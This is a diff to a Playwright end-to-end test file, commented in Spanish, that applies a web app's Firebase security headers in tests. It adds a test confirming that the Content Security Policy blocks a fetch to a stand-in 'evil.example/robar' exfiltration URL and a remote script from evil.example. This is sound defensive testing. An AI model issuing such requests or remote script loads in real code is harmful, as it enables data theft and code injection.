@@ -12,6 +12,10 @@ import { chromium } from "playwright";
 const RAIZ = fileURLToPath(new URL("..", import.meta.url));
 const TIPOS = { ".html": "text/html", ".js": "text/javascript", ".css": "text/css", ".json": "application/json", ".png": "image/png", ".svg": "image/svg+xml", ".webp": "image/webp" };
 let servidor, base, navegador, stubs = null;
+// Las mismas cabeceras de seguridad que envía Firebase Hosting (firebase.json), incluida la CSP,
+// para que las pruebas fallen si la política bloquea algo que la app necesita.
+const CABECERAS = Object.fromEntries((JSON.parse(await readFile(join(RAIZ, "firebase.json"), "utf8")).hosting.headers
+  .find(h => h.source === "**")?.headers || []).map(h => [h.key, h.value]));
 
 // Modo sin internet (E2E_OFFLINE=1): los módulos de Firebase del CDN se reemplazan por
 // módulos vacíos generados a partir de los import del código; el modo demo no los usa.
@@ -42,7 +46,7 @@ before(async () => {
     const ruta = normalize(decodeURIComponent(new URL(req.url, "http://x").pathname)).replace(/^(\.\.[/\\])+/, "");
     try {
       const datos = await readFile(join(RAIZ, ruta === "/" ? "index.html" : ruta));
-      res.writeHead(200, { "Content-Type": TIPOS[extname(ruta)] || "application/octet-stream" });
+      res.writeHead(200, { ...CABECERAS, "Content-Type": TIPOS[extname(ruta)] || "application/octet-stream" });
       res.end(datos);
     } catch { res.writeHead(404); res.end(); }
   }).listen(0);
@@ -58,6 +62,7 @@ async function abrirDemo({ ancho = 390, alto = 844, tema = "dark", guia = false 
   const p = await ctx.newPage();
   const errores = [];
   p.on("pageerror", e => errores.push(e.message));
+  p.on("console", m => { if (/Content Security Policy/i.test(m.text())) errores.push("CSP: " + m.text()); });
   if (stubs) await p.route(/^https?:\/\/(?!localhost)/, async r => {
     const u = r.request().url();
     if (u.includes("gstatic.com/firebasejs")) return r.fulfill({ body: stubs[u.split("/").pop()] || "", contentType: "text/javascript" });
@@ -222,6 +227,22 @@ test("accesibilidad (axe, WCAG 2 A/AA): sin fallas en las pantallas principales,
     await ctx.close();
   }
   assert.deepEqual(fallas, []);
+});
+
+test("la política de seguridad (CSP) bloquea scripts y conexiones a dominios no autorizados", async () => {
+  const { ctx, p } = await abrirDemo();
+  // Se escucha el evento del navegador que confirma que fue la CSP (no la red) quien lo bloqueó
+  const res = await p.evaluate(async () => {
+    const vistas = [];
+    document.addEventListener("securitypolicyviolation", e => vistas.push(e.effectiveDirective + " " + e.blockedURI));
+    try { await fetch("https://evil.example/robar", { mode: "no-cors" }); } catch {}
+    await new Promise(ok => { const s = document.createElement("script"); s.src = "https://evil.example/x.js"; s.onload = s.onerror = ok; document.head.appendChild(s); });
+    await new Promise(ok => setTimeout(ok, 200));
+    return vistas;
+  });
+  assert.ok(res.some(v => v.startsWith("connect-src") && v.includes("evil.example")), JSON.stringify(res));
+  assert.ok(res.some(v => v.startsWith("script-src") && v.includes("evil.example")), JSON.stringify(res));
+  await ctx.close();
 });
 
 test("en computador se usa la barra lateral y nada se desborda", async () => {
